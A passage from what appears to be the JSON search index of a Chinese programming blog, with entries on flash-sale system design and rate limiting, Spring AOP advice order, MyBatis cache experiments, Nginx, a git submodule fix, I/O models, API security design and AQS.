通常情况下，如果用户秒杀成功了，下单之后，在15分钟之内还未完成支付的话，该订单会被自动取消，回退库存。\n那么，在15分钟内未完成支付，订单被自动取消的功能，要如何实现呢？\n我们首先想到的可能是job，因为它比较简单。\n但job有个问题，需要每隔一段时间处理一次，实时性不太好。\n还有更好的方案？\n答：使用延迟队列。\n我们都知道rocketmq，自带了延迟队列的功能。\n下单时消息生产者会先生成订单，此时状态为待支付，然后会向延迟队列中发一条消息。达到了延迟时间，消息消费者读取消息之后，会查询该订单的状态是否为待支付。如果是待支付状态，则会更新订单状态为取消状态。如果不是待支付状态，说明该订单已经支付过了，则直接返回。\n当然需要完成上述功能，需要用户完成支付之后，修改订单状态为已支付。具体来说，支付系统完成支付之后，回调秒杀系统这边提供的回调接口去修改订单支付状态。\n4. 接口限流 通过秒杀活动，如果我们运气爆棚，可能会用非常低的价格买到不错的商品（这种概率堪比买福利彩票中大奖）。\n但有些高手，并不会像我们一样老老实实，通过秒杀页面点击秒杀按钮，抢购商品。他们可能在自己的服务器上，模拟正常用户登录系统，跳过秒杀页面，直接调用秒杀接口。\n如果是我们手动操作，一般情况下，一秒钟只能点击一次秒杀按钮。\n但是如果是服务器，一秒钟可以请求成上千接口。\n这种差距实在太明显了，如果不做任何限制，绝大部分商品可能是被机器抢到，而非正常的用户，有点不太公平。\n所以，我们有必要识别这些非法请求，做一些限制。那么，我们该如何现在这些非法请求呢？\n目前有两种常用的限流方式：\n 基于nginx限流 基于redis限流  4.1 对同一用户限流 限制同一个用户id，比如每分钟只能请求5次接口。\n4.2 对同一ip限流 有时候只对某个用户限流是不够的，有些高手可以模拟多个用户请求，这种nginx就没法识别了。\n这时需要加同一ip限流功能。限制同一个ip，比如每分钟只能请求5次接口。\n但这种限流方式可能会有误杀的情况，比如同一个公司或网吧的出口ip是相同的，如果里面有多个正常用户同时发起请求，有些用户可能会被限制住。\n4.3 对接口限流 别以为限制了用户和ip就万事大吉，有些高手甚至可以使用代理，每次都请求都换一个ip。\n这时可以限制请求的接口总次数。\n在高并发场景下，这种限制对于系统的稳定性是非常有必要的。但可能由于有些非法请求次数太多，达到了该接口的请求上限，而影响其他的正常用户访问该接口。看起来有点得不偿失。\n4.4 加验证码 相对于上面三种方式，加验证码的方式可能更精准一些，同样能限制用户的访问频次，但好处是不会存在误杀的情况。\n通常情况下，用户在请求之前，需要先输入验证码。用户发起请求之后，服务端会去校验该验证码是否正确。只有正确才允许进行下一步操作，否则直接返回，并且提示验证码错误。\n4.5 提高业务门槛 上面说的加验证码虽然可以限制非法用户请求，但是有些影响用户体验。用户点击秒杀按钮前，还要先输入验证码，流程显得有点繁琐，秒杀功能的流程不是应该越简单越好吗？\n其实，有时候达到某个目的，不一定非要通过技术手段，通过业务手段也一样。\n我们通过提高业务门槛，比如只有会员才能参与秒杀活动，普通注册用户没有权限。或者，只有等级到达3级以上的普通用户，才有资格参加该活动。\n参考 高并发下秒杀商品，你必须知道的 9 个细节 ","date":"2021-08-31","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/sa/%E7%A7%92%E6%9D%80%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1/","series":["Manual"],"tags":["SA"],"title":"秒杀系统设计"},{"categories":["编程思想"],"content":"1. 一个方法只被一个Aspect类拦截 在一个方法只被一个aspect类拦截时，aspect类内部的 advice 将按照以下的顺序进行执行：\n正常情况：  异常情况： 2. 同一个方法被多个Aspect类拦截 比如，我们为 apsect1 和 aspect2 分别添加 @Order 注解，如下：\n@Order(5) @Component @Aspect public class Aspect1 { // ... } @Order(6) @Component @Aspect public class Aspect2 { // ... } 这样修改之后，可保证不管在任何情况下， aspect1 中的 advice 总是比 aspect2 中的 advice 先执行。如下图所示： 注意点  如果在同一个 aspect 类中，针对同一个 pointcut，定义了两个相同的 advice(比如，定义了两个 @Before)，那么这两个 advice 的执行顺序是无法确定的，哪怕你给这两个 advice 添加了 @Order 这个注解，也不行。这点切记。 对于@Around这个advice，不管它有没有返回值，但是必须要方法内部，调用一下 pjp.proceed();否则，Controller 中的接口将没有机会被执行，从而也导致了 @Before这个advice不会被触发。比如，我们假设正常情况下，执行顺序为”aspect2 -\u0026gt; apsect1 -\u0026gt; controller”，如果，我们把 aspect1中的@Around中的 pjp.proceed();给删掉，那么，我们看到的输出结果将是：  [Aspect2] around advise 1 [Aspect2] before advise [Aspect1] around advise 1 [Aspect1] around advise2 [Aspect1] after advise [Aspect1] afterReturning advise [Aspect2] around advise2 [Aspect2] after advise [Aspect2] afterReturning advise 从结果可以发现， Controller 中的 接口 未被执行，aspect1 中的 @Before advice 也未被执行。\n参考 Spring Aop实例@Aspect、@Before、@AfterReturning@Around 注解方式配置 ","date":"2021-08-31","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/spring/springaop%E6%89%A7%E8%A1%8C%E9%A1%BA%E5%BA%8F/","series":["Manual"],"tags":["Spring"],"title":"SpringAOP执行顺序"},{"categories":["编程思想"],"content":"一级缓存 一级缓存介绍 在应用运行过程中，我们有可能在一次数据库会话中，执行多次查询条件完全相同的SQL，MyBatis提供了一级缓存的方案优化这部分场景，如果是相同的SQL语句，会优先命中一级缓存，避免直接对数据库进行查询，提高性能。具体执行过程如下图所示。\n每个SqlSession中持有了Executor，每个Executor中有一个LocalCache。当用户发起查询时，MyBatis根据当前执行的语句生成MappedStatement，在Local Cache进行查询，如果缓存命中的话，直接返回结果给用户，如果缓存没有命中的话，查询数据库，结果写入Local Cache，最后返回结果给用户。具体实现类的类关系图如下图所示。\n一级缓存配置 我们来看看如何使用MyBatis一级缓存。开发者只需在MyBatis的配置文件中，添加如下语句，就可以使用一级缓存。共有两个选项，SESSION或者STATEMENT，默认是SESSION级别，即在一个MyBatis会话中执行的所有语句，都会共享这一个缓存。一种是STATEMENT级别，可以理解为缓存只对当前执行的这一个Statement有效。\n\u0026lt;setting name=\u0026#34;localCacheScope\u0026#34; value=\u0026#34;SESSION\u0026#34;/\u0026gt;  一级缓存的范围有SESSION和STATEMENT两种，默认是SESSION，如果不想使用一级缓存，可以把一级缓存的范围指定为STATEMENT，这样每次执行完一个Mapper中的语句后都会将一级缓存清除。\n  当Mybatis整合Spring后，直接通过Spring注入Mapper的形式，如果不是在同一个事务中每个Mapper的每次查询操作都对应一个全新的SqlSession实例，这个时候就不会有一级缓存的命中，但是在同一个事务中时共用的是同一个SqlSession。\n 一级缓存实验 接下来通过实验，了解MyBatis一级缓存的效果，每个单元测试后都请恢复被修改的数据。\n首先是创建示例表student，创建对应的POJO类和增改的方法，具体可以在entity包和mapper包中查看。\nCREATE TABLE `student` ( `id` int(11) unsigned NOT NULL AUTO_INCREMENT, `name` varchar(200) COLLATE utf8_bin DEFAULT NULL, `age` tinyint(3) unsigned DEFAULT NULL, PRIMARY KEY (`id`) ) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=utf8 COLLATE=utf8_bin; 在以下实验中，id为1的学生名称是凯伦。\n实验1 开启一级缓存，范围为会话级别，调用三次getStudentById，代码如下所示：\npublic void getStudentById() throws Exception { SqlSession sqlSession = factory.openSession(true); // 自动提交事务  StudentMapper studentMapper = sqlSession.getMapper(StudentMapper.class); System.out.println(studentMapper.getStudentById(1)); System.out.println(studentMapper.getStudentById(1)); System.out.println(studentMapper.getStudentById(1)); } 执行结果：\n我们可以看到，只有第一次真正查询了数据库，后续的查询使用了一级缓存。\n实验2 增加了对数据库的修改操作，验证在一次数据库会话中，如果对数据库发生了修改操作，一级缓存是否会失效。\n@Test public void addStudent() throws Exception { SqlSession sqlSession = factory.openSession(true); // 自动提交事务  StudentMapper studentMapper = sqlSession.getMapper(StudentMapper.class); System.out.println(studentMapper.getStudentById(1)); System.out.println(\u0026#34;增加了\u0026#34; + studentMapper.addStudent(buildStudent()) + \u0026#34;个学生\u0026#34;); System.out.println(studentMapper.getStudentById(1)); sqlSession.close(); } 执行结果：\n我们可以看到，在修改操作后执行的相同查询，查询了数据库，一级缓存失效。\n实验3 开启两个SqlSession，在sqlSession1中查询数据，使一级缓存生效，在sqlSession2中更新数据库，验证一级缓存只在数据库会话内部共享。\n@Test public void testLocalCacheScope() throws Exception { SqlSession sqlSession1 = factory.openSession(true); SqlSession sqlSession2 = factory.openSession(true); StudentMapper studentMapper = sqlSession1.getMapper(StudentMapper.class); StudentMapper studentMapper2 = sqlSession2.getMapper(StudentMapper.class); System.out.println(\u0026#34;studentMapper读取数据: \u0026#34; + studentMapper.getStudentById(1)); System.out.println(\u0026#34;studentMapper读取数据: \u0026#34; + studentMapper.getStudentById(1)); System.out.println(\u0026#34;studentMapper2更新了\u0026#34; + studentMapper2.updateStudentName(\u0026#34;小岑\u0026#34;,1) + \u0026#34;个学生的数据\u0026#34;); System.out.println(\u0026#34;studentMapper读取数据: \u0026#34; + studentMapper.getStudentById(1)); System.out.println(\u0026#34;studentMapper2读取数据: \u0026#34; + studentMapper2.getStudentById(1)); } sqlSession2更新了id为1的学生的姓名，从凯伦改为了小岑，但session1之后的查询中，id为1的学生的名字还是凯伦，出现了脏数据，也证明了之前的设想，一级缓存只在数据库会话内部共享。\n总结  MyBatis一级缓存的生命周期和SqlSession一致。 MyBatis一级缓存内部设计简单，只是一个没有容量限定的HashMap，在缓存的功能性上有所欠缺。 MyBatis的一级缓存最大范围是SqlSession内部，有多个SqlSession或者分布式的环境下，数据库写操作会引起脏数据，建议设定缓存级别为Statement。  二级缓存 二级缓存介绍 在上文中提到的一级缓存中，其最大的共享范围就是一个SqlSession内部，如果多个SqlSession之间需要共享缓存，则需要使用到二级缓存。开启二级缓存后，会使用CachingExecutor装饰Executor，进入一级缓存的查询流程前，先在CachingExecutor进行二级缓存的查询，具体的工作流程如下所示。\n二级缓存开启后，同一个namespace下的所有操作语句，都影响着同一个Cache，即二级缓存被多个SqlSession共享，是一个全局的变量。\n当开启缓存后，数据的查询执行的流程就是 二级缓存 -\u0026gt; 一级缓存 -\u0026gt; 数据库。\n二级缓存配置 要正确的使用二级缓存，需完成如下配置的。\n 在MyBatis的配置文件中开启二级缓存。  \u0026lt;setting name=\u0026#34;cacheEnabled\u0026#34; value=\u0026#34;true\u0026#34;/\u0026gt;  在MyBatis的映射XML中配置cache或者 cache-ref 。  cache标签用于声明这个namespace使用二级缓存，并且可以自定义配置。\n\u0026lt;cache/\u0026gt;  type：cache使用的类型，默认是PerpetualCache，这在一级缓存中提到过。 eviction： 定义回收的策略，常见的有FIFO，LRU。 flushInterval： 配置一定时间自动刷新缓存，单位是毫秒。 size： 最多缓存对象的个数。 readOnly： 是否只读，若配置可读写，则需要对应的实体类能够序列化。 blocking： 若缓存中找不到对应的key，是否会一直blocking，直到有对应的数据进入缓存。  cache-ref代表引用别的命名空间的Cache配置，两个命名空间的操作使用的是同一个Cache。\n\u0026lt;cache-ref namespace=\u0026#34;mapper.StudentMapper\u0026#34;/\u0026gt; 二级缓存实验 接下来我们通过实验，了解MyBatis二级缓存在使用上的一些特点。\n在本实验中，id为1的学生名称初始化为点点。\n实验1 测试二级缓存效果，不提交事务，sqlSession1查询完数据后，sqlSession2相同的查询是否会从缓存中获取数据。\n@Test public void testCacheWithoutCommitOrClose() throws Exception { SqlSession sqlSession1 = factory.openSession(true); SqlSession sqlSession2 = factory.openSession(true); StudentMapper studentMapper = sqlSession1.getMapper(StudentMapper.class); StudentMapper studentMapper2 = sqlSession2.getMapper(StudentMapper.class); System.out.println(\u0026#34;studentMapper读取数据: \u0026#34; + studentMapper.getStudentById(1)); System.out.println(\u0026#34;studentMapper2读取数据: \u0026#34; + studentMapper2.getStudentById(1)); } 执行结果：\n我们可以看到，当sqlsession没有调用commit()方法时，二级缓存并没有起到作用。\n实验2 测试二级缓存效果，当提交事务时，sqlSession1查询完数据后，sqlSession2相同的查询是否会从缓存中获取数据。\n@Test public void testCacheWithCommitOrClose() throws Exception { SqlSession sqlSession1 = factory.openSession(true); SqlSession sqlSession2 = factory.openSession(true); StudentMapper studentMapper = sqlSession1.getMapper(StudentMapper.class); StudentMapper studentMapper2 = sqlSession2.getMapper(StudentMapper.class); System.out.println(\u0026#34;studentMapper读取数据: \u0026#34; + studentMapper.getStudentById(1)); sqlSession1.commit(); System.out.println(\u0026#34;studentMapper2读取数据: \u0026#34; + studentMapper2.getStudentById(1)); } 从图上可知，sqlsession2的查询，使用了缓存，缓存的命中率是0.5。\n实验3 测试update操作是否会刷新该namespace下的二级缓存。\n@Test public void testCacheWithUpdate() throws Exception { SqlSession sqlSession1 = factory.openSession(true); SqlSession sqlSession2 = factory.openSession(true); SqlSession sqlSession3 = factory.openSession(true); StudentMapper studentMapper = sqlSession1.getMapper(StudentMapper.class); StudentMapper studentMapper2 = sqlSession2.getMapper(StudentMapper.class); StudentMapper studentMapper3 = sqlSession3.getMapper(StudentMapper.class); System.out.println(\u0026#34;studentMapper读取数据: \u0026#34; + studentMapper.getStudentById(1)); sqlSession1.commit(); System.out.println(\u0026#34;studentMapper2读取数据: \u0026#34; + studentMapper2.getStudentById(1)); studentMapper3.updateStudentName(\u0026#34;方方\u0026#34;,1); sqlSession3.commit(); System.out.println(\u0026#34;studentMapper2读取数据: \u0026#34; + studentMapper2.getStudentById(1)); } 我们可以看到，在sqlSession3更新数据库，并提交事务后，sqlsession2的StudentMapper namespace下的查询走了数据库，没有走Cache。\n实验4 验证MyBatis的二级缓存不适应用于映射文件中存在多表查询的情况。\n通常我们会为每个单表创建单独的映射文件，由于MyBatis的二级缓存是基于namespace的，多表查询语句所在的namspace无法感应到其他namespace中的语句对多表查询中涉及的表进行的修改，引发脏数据问题。\n@Test public void testCacheWithDiffererntNamespace() throws Exception { SqlSession sqlSession1 = factory.openSession(true); SqlSession sqlSession2 = factory.openSession(true); SqlSession sqlSession3 = factory.openSession(true); StudentMapper studentMapper = sqlSession1.getMapper(StudentMapper.class); StudentMapper studentMapper2 = sqlSession2.getMapper(StudentMapper.class); ClassMapper classMapper = sqlSession3.getMapper(ClassMapper.class); System.out.println(\u0026#34;studentMapper读取数据: \u0026#34; + studentMapper.getStudentByIdWithClassInfo(1)); sqlSession1.close(); System.out.println(\u0026#34;studentMapper2读取数据: \u0026#34; + studentMapper2.getStudentByIdWithClassInfo(1)); classMapper.updateClassName(\u0026#34;特色一班\u0026#34;,1); sqlSession3.commit(); System.out.println(\u0026#34;studentMapper2读取数据: \u0026#34; + studentMapper2.getStudentByIdWithClassInfo(1)); } 执行结果：\n在这个实验中，我们引入了两张新的表，一张class，一张classroom。class中保存了班级的id和班级名，classroom中保存了班级id和学生id。我们在StudentMapper中增加了一个查询方法getStudentByIdWithClassInfo，用于查询学生所在的班级，涉及到多表查询。在ClassMapper中添加了updateClassName，根据班级id更新班级名的操作。\n当sqlsession1的studentmapper查询数据后，二级缓存生效。保存在StudentMapper的namespace下的cache中。当sqlSession3的classMapper的updateClassName方法对class表进行更新时，updateClassName不属于StudentMapper的namespace，所以StudentMapper下的cache没有感应到变化，没有刷新缓存。当StudentMapper中同样的查询再次发起时，从缓存中读取了脏数据。\n实验5 为了解决实验4的问题呢，可以使用Cache ref，让ClassMapper引用StudenMapper命名空间，这样两个映射文件对应的SQL操作都使用的是同一块缓存了。\n执行结果：\n不过这样做的后果是，缓存的粒度变粗了，多个Mapper namespace下的所有操作都会对缓存使用造成影响。\n总结  MyBatis的二级缓存相对于一级缓存来说，实现了SqlSession之间缓存数据的共享，同时粒度更加的细，能够到namespace级别，通过Cache接口实现类不同的组合，对Cache的可控性也更强。 MyBatis在多表查询时，极大可能会出现脏数据，有设计上的缺陷，安全使用二级缓存的条件比较苛刻。 在分布式环境下，由于默认的MyBatis Cache实现都是基于本地的，分布式环境下必然会出现读取到脏数据，需要使用集中式缓存将MyBatis的Cache接口实现，有一定的开发成本。  参考 聊聊MyBatis缓存机制 ","date":"2021-08-30","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/mybatis/mybatis%E7%BC%93%E5%AD%98%E6%9C%BA%E5%88%B6/","series":["Manual"],"tags":["MyBatis"],"title":"MyBatis缓存机制"},{"categories":["编程思想"],"content":"参考 高可用实现KeepAlived原理简介 keepalived：简介、nginx+keepalived集群、nginx+keepalived双主架构 ","date":"2021-08-29","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/nginx/%E5%9F%BA%E4%BA%8Ekeepalived%E5%AE%9E%E7%8E%B0nginx%E9%AB%98%E5%8F%AF%E7%94%A8/","series":["Manual"],"tags":["nginx"],"title":"基于keepalived实现nginx高可用"},{"categories":["编程思想"],"content":"Nginx 实现负载均衡的分配策略有很多，Nginx 的 upstream 目前支持以下几种方式：\n 轮询（默认）：每个请求按时间顺序逐一分配到不同的后端服务器，如果后端服务器 down 掉，能自动剔除。 weight：指定轮询几率，weight 和访问比率成正比，用于后端服务器性能不均的情况。 ip_hash：每个请求按访问 ip 的 hash 结果分配，这样每个访客固定访问一个后端服务器，可以解决 session 的问题。 fair（第三方）：按后端服务器的响应时间来分配请求，响应时间短的优先分配。 url_hash（第三方）：按访问 url 的 hash 结果来分配请求，使每个 url 定向到同一个后端服务器，后端服务器为缓存时比较有效。  参考 LVS、Nginx、HAProxy、keepalive 的工作原理 ","date":"2021-08-29","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/nginx/nginx%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1/","series":["Manual"],"tags":["nginx"],"title":"Nginx负载均衡"},{"categories":["编程思想"],"content":"参考 字节码增强：原理与实战 ","date":"2021-08-29","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/java/%E5%AD%97%E8%8A%82%E7%A0%81%E5%AE%9E%E6%88%98/","series":["Manual"],"tags":["Java"],"title":"字节码实战"},{"categories":["其他"],"content":"执行 git submodule update --init --recursive 的时候报错：\nfatal: remote error: upload-pack: not our ref fc7223ca00124e8f5b5b354457379071e2fd091b Fetched in submodule path \u0026#39;themes/hugo-theme-bootstrap\u0026#39;, but it did not contain fc7223ca00124e8f5b5b354457379071e2fd091b. Direct fetching of that commit failed. 解决：\ncd {submodule path} git reset --hard origin/master cd - git clean -n git add {submodule path} git commit git submodule update --init --recursive 参考 git - 为什么git子模块更新会因 \u0026ldquo;fatal: remote error: upload-pack: not our ref\u0026quot;而失败？ ","date":"2021-08-28","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/other/git-submodule-update-init-recursive/","series":["Manual"],"tags":["Other"],"title":"git submodule update --init --recursive"},{"categories":["编程思想"],"content":"class Solution { public int lengthOfLIS(int[] nums) { if (nums == null || nums.length == 0){return 0;} int[] dp = new int[nums.length]; Arrays.fill(dp,1); for (int i = 0; i \u0026lt; nums.length; i++) { for (int j = 0; j \u0026lt; i; j++) { if(nums[i] \u0026gt; nums[j] \u0026amp;\u0026amp; dp[j] + 1 \u0026gt; dp[i]){ dp[i] = dp[j] + 1; } } } return Arrays.stream(dp).max().getAsInt(); } } 300. 最长递增子序列 ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/algorithm/leetcode/300.-%E6%9C%80%E9%95%BF%E9%80%92%E5%A2%9E%E5%AD%90%E5%BA%8F%E5%88%97/","series":["算法"],"tags":["LeetCode"],"title":"300. 最长递增子序列"},{"categories":["编程思想"],"content":"需要设置 proxy_set_header Host $host:$server_port;\nlocation ^~/gateway/ { proxy_set_header Host $host:$server_port; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-NginX-Proxy true; proxy_pass http://k8s_yshop-gateway-svc/; } ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/nginx/400-bad-request/","series":["Manual"],"tags":["nginx"],"title":"400 Bad Request"},{"categories":["计算机科学"],"content":"1. 前言 W. Richard Stevens在 《Unix Network Programming Volume 1 3rd Edition - The Sockets Networking API》文中的6.2 I/O Models小节中对如下5中IO模型进行了详细的阐述：\n blocking I/O nonblocking I/O I/O multiplexing (select and poll) signal driven I/O (SIGIO) asynchronous I/O (the POSIX aio_functions)  由signal driven IO在实际中并不常用，所以主要介绍其余四种IO Model。\n再说一下IO发生时涉及的对象和步骤。对于一个network IO (这里我们以read举例)，它会涉及到两个系统对象，一个是调用这个IO的process (or thread)，另一个就是系统内核(kernel)。当一个read操作发生时，它会经历两个阶段：\n 等待数据准备 (Waiting for the data to be ready)（将数据从网卡读到内核） 将数据从内核拷贝到进程中(Copying the data from the kernel to the process)  记住这两点很重要，因为这些IO模型的区别就是在两个阶段上各有不同的情况。\n2. 概念说明 在进行解释之前，首先要说明几个概念：\n 用户空间和内核空间 进程切换 进程的阻塞 文件描述符 缓存 I/O  2.1 用户空间与内核空间 现在操作系统都是采用虚拟存储器，那么对32位操作系统而言，它的寻址空间（虚拟存储空间）为4G（2的32次方）。操作系统的核心是内核，独立于普通的应用程序，可以访问受保护的内存空间，也有访问底层硬件设备的所有权限。为了保证用户进程不能直接操作内核（kernel），保证内核的安全，操心系统将虚拟空间划分为两部分，一部分为内核空间，一部分为用户空间。针对linux操作系统而言，将最高的1G字节（从虚拟地址0xC0000000到0xFFFFFFFF），供内核使用，称为内核空间，而将较低的3G字节（从虚拟地址0x00000000到0xBFFFFFFF），供各个进程使用，称为用户空间。\n2.2 进程切换 为了控制进程的执行，内核必须有能力挂起正在CPU上运行的进程，并恢复以前挂起的某个进程的执行。这种行为被称为进程切换。因此可以说，任何进程都是在操作系统内核的支持下运行的，是与内核紧密相关的。 从一个进程的运行转到另一个进程上运行，这个过程中经过下面这些变化：\n  保存处理机上下文，包括程序计数器和其他寄存器。\n  更新PCB信息。\n  把进程的PCB移入相应的队列，如就绪、在某事件阻塞等队列。\n  选择另一个进程执行，并更新其PCB。\n  更新内存管理的数据结构。\n  恢复处理机上下文。\n注：总而言之就是很耗资源\n  2.3 进程的阻塞 正在执行的进程，由于期待的某些事件未发生，如请求系统资源失败、等待某种操作的完成、新数据尚未到达或无新工作做等，则由系统自动执行阻塞原语(Block)，使自己由运行状态变为阻塞状态。可见，进程的阻塞是进程自身的一种主动行为，也因此只有处于运行态的进程（获得CPU），才可能将其转为阻塞状态。当进程进入阻塞状态，是不占用CPU资源的。\n2.4 文件描述符fd 文件描述符（File descriptor）是计算机科学中的一个术语，是一个用于表述指向文件的引用的抽象化概念。 文件描述符在形式上是一个非负整数。实际上，它是一个索引值，指向内核为每一个进程所维护的该进程打开文件的记录表。当程序打开一个现有文件或者创建一个新文件时，内核向进程返回一个文件描述符。在程序设计中，一些涉及底层的程序编写往往会围绕着文件描述符展开。但是文件描述符这一概念往往只适用于UNIX、Linux这样的操作系统。\n2.5 缓存 I/O 缓存 I/O 又被称作标准 I/O，大多数文件系统的默认 I/O 操作都是缓存 I/O。在 Linux 的缓存 I/O 机制中，操作系统会将 I/O 的数据缓存在文件系统的页缓存（ page cache ）中，也就是说，数据会先被拷贝到操作系统内核的缓冲区中，然后才会从操作系统内核的缓冲区拷贝到应用程序的地址空间。\n 缓存 I/O 的缺点： 数据在传输过程中需要在应用程序地址空间和内核进行多次数据拷贝操作，这些数据拷贝操作所带来的 CPU 以及内存开销是\n 3. IO模型 3.1 blocking IO 在linux中，默认情况下所有的socket都是blocking，一个典型的读操作流程大概是这样：\n当用户进程调用了recvfrom这个系统调用，kernel就开始了IO的第一个阶段：准备数据（对于网络IO来说，很多时候数据在一开始还没有到达。比如，还没有收到一个完整的UDP包。这个时候kernel就要等待足够的数据到来）。这个过程需要等待，也就是说数据被拷贝到操作系统内核的缓冲区中是需要一个过程的。而在用户进程这边，整个进程会被阻塞（当然，是进程自己选择的阻塞)。当kernel一直等到数据准备好了，它就会将数据从kernel中拷贝到用户内存，然后kernel返回结果，用户进程才解除block的状态，重新运行起来。\n 所以，blocking IO的特点就是在IO执行的两个阶段都被block了。\n 3.2 nonblocking IO linux下，可以通过设置socket使其变为non-blocking。当对一个non-blocking socket执行读操作时，流程是这个样子：\n当用户进程发出read操作时，如果kernel中的数据还没有准备好，那么它并不会block用户进程，而是立刻返回一个EWOULDBLOCK的error。从用户进程角度讲 ，它发起一个read操作后，并不需要等待，而是马上就得到了一个结果。用户进程判断结果是一个error时，它就知道数据还没有准备好，于是它可以再次发送read操作。一旦kernel中的数据准备好了，并且又再次收到了用户进程的system call，那么它马上就将数据拷贝到了用户内存，然后返回。\n 所以，nonblocking IO的特点是用户进程需要不断的主动询问kernel数据好了没有。\n 3.3 IO multiplexing IO multiplexing就是我们说的select，poll，epoll，有些地方也称这种IO方式为event driven IO。select/epoll的好处就在于单个process就可以同时处理多个网络连接的IO。它的基本原理就是select，poll，epoll这个function会不断的轮询所负责的所有socket，当某个socket有数据到达了，就通知用户进程。\n当用户进程调用了select，那么整个进程会被block，而同时，kernel会“监视”所有select负责的socket，当任何一个socket中的数据准备好了，select就会返回。这个时候用户进程再调用read操作，将数据从kernel拷贝到用户进程。\n这个图和blocking IO的图其实并没有太大的不同，事实上，还更差一些。因为这里需要使用两个system call (select和 recvfrom)，而blocking IO只调用了一个system call (recvfrom)。但是，用select的优势在于它可以同时处理多个connection。\n所以，如果处理的连接数不是很高的话，使用select/epoll的web server不一定比使用multi-threading + blocking IO的web server性能更好，可能延迟还更大。select/epoll的优势并不是对于单个连接能处理得更快，而是在于能处理更多的连接。\n在I/O编程过程中，当需要同时处理多个客户端接入请求时，可以利用多线程或者I/O多路复用技术进行处理。I/O多路复用技术通过把多个I/O的阻塞复用到同一个select的阻塞上，从而使得系统在单线程的情况下可以同时处理多个客户端请求。与传统的多线程/多进程模型比，I/O多路复用的最大优势是系统开销小，系统不需要创建新的额外进程或者线程，也不需要维护这些进程和线程的运行，降底了系统的维护工作量，节省了系统资源。\n 所以，I/O 多路复用的特点是通过一种机制一个进程能同时等待多个文件描述符，而这些文件描述符（套接字描述符）其中的任意一个进入读就绪状态，select()函数就可以返回。\n 3.4 signal-driven IO 信号驱动式I/O：首先我们允许Socket进行信号驱动IO,并安装一个信号处理函数，进程继续运行并不阻塞。当数据准备好时，进程会收到一个SIGIO信号，可以在信号处理函数中调用I/O操作函数处理数据。过程如下图所示：\n3.5 asynchronous IO 相对于同步IO，异步IO不是顺序执行。用户进程进行aio_read系统调用之后，无论内核数据是否准备好，都会直接返回给用户进程，然后用户态进程可以去做别的事情。等到socket数据准备好了，内核直接复制数据给进程，然后从内核向进程发送通知。IO两个阶段，进程都是非阻塞的。\nLinux提供了AIO库函数实现异步，但是用的很少。目前有很多开源的异步IO库，例如libevent、libev、libuv。异步过程如下图所示：\n用户进程发起read操作之后，立刻就可以开始去做其它的事。而另一方面，从kernel的角度，当它受到一个asynchronous read之后，首先它会立刻返回，所以不会对用户进程产生任何block。然后，kernel会等待数据准备完成，然后将数据拷贝到用户内存，当这一切都完成之后，kernel会给用户进程发送一个signal，告诉它read操作完成了。\n 所以，aio的特点是两个阶段都不阻塞，特别是第二阶段，数据从内核空间拷贝到用户空间是是系统完成的，系统完成拷贝后再通知应用进程。\n 4. 总结 5. 参考资料 W. Richard Stevens - Unix Network Programming Volume 1 3rd Edition - The Sockets Networking API.pdf 聊聊Linux 五种IO模型 猿码架构 Linux IO模式及 select、poll、epoll详解 ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/cs/system/5%E7%A7%8Dio%E6%A8%A1%E5%9E%8B/","series":["Manual"],"tags":["System","IO","CS"],"title":"5种IO模型"},{"categories":["架构演进"],"content":" 验签：防接口被肆意调用  client对request签名，server对请求进行验签。\n鉴权：防调用没有权限的接口  token鉴权，实际上验签、鉴权通常是一同处理的，例如：OAuth2\n验证请求的timestamp：防盗链  当前时间 - timestamp \u0026gt; 阈值，则说明该请求已经失效。\nnonce随机数：防重复提交  上述验证timestamp的过程中存在一个问题，例如：阈值 = 60s，那么60s内发生重复提交怎么办？\n解决办法是：server端保存带随机数的请求（随机数+原请求 = 新请求，通常是redis保存）。\n接口幂等性保证（唯一主键、乐观锁）  幂等性：以相同的请求调用这个接口一次和调用这个接口多次，对系统产生的影响是相同的。\n高并发下接口幂等性解决方案 恶意的重复提交：请求的timestamp、nonce较上一次没变，这种情况通过redis保存带随机数的请求可以杜绝。\n用户误操作导致的重复提交：前端控制+幂等设计。\n幂等与重复提交的区别在于：幂等是在重复提交已经发生了的情况下，如何保证多次调用接口的结果一致，重复提交在前，幂等保证在后。\n参考链接： 如何保证接口的幂等性 说说API的防重放机制 Java生鲜电商平台-API接口设计之token、timestamp、sign 具体架构与实现（APP/小程序，传输安全） 阿里一面：如何保证API接口数据安全？ 实现接口幂等性的几种方案 ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/sa/api%E6%8E%A5%E5%8F%A3%E5%AE%89%E5%85%A8%E8%AE%BE%E8%AE%A1/","series":["Manual"],"tags":["SA"],"title":"API接口安全设计"},{"categories":["编程思想"],"content":"AQS作为Java并发编程的基石，在Java同步工具中有广泛应用，例如：ReentrantLock , Semaphore , CountDownLatch ReentrantReadWriteLock , ThreadPoolExecutor\n一般来说，自定义同步器要么是独占方式，要么是共享方式，它们也只需实现 tryAcquire / tryRelease , tryAcquireShared / tryReleaseShared 